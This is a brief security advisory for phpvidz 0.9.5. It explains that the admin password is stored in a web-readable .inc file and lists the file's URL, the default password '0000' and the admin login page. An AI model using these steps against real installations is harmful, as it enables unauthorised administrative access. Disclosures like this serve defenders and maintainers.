Researcher: Michael Brooks
Affecting: phpvidz 0.9.5
Vulnerability: Administrative Credentials Disclosure
Vendor's Homepage: http://sourceforge.net/projects/phpvidz/

phpvidz does not use a SQL database. Instead it uses a system of flat
files to maintain application state. The administrative password is
stored within the following file and is included during runtime.
Because this file has a .inc extension it is viewable by the attacker.

To exploit this issue visit this url:
http://localhost/phpvidz_0.9.5/includes/init.inc
By default the password is the following constant:
define ('ADMINPASSWORD' , '0000' );
This password can be used to login here (A username is not required):
http://localhost/phpvidz_0.9.5/admin.php
